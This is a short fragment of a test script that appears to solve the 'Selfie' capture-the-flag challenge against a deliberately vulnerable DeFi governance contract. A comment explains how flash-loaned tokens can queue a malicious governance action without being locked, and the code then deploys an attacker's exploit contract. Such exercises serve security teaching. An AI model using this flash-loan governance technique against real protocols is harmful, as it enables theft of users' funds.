...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        // The problem lies with the simple governance. Queue action doesnt require the
        // user to lock up their tokens so it is possible to flashloan some tokens
        // to help create a proposal (queue action) and then subsequently execute said
        // action 2 days later.
        const Exploit = await ethers.getContractFactory("contracts/selfie/Exploit.sol:Exploit", attacker);
        const exploit = await Exploit.deploy(this.pool.address, this.governance.address);

        await exploit.prep(TOKENS_IN_POOL);
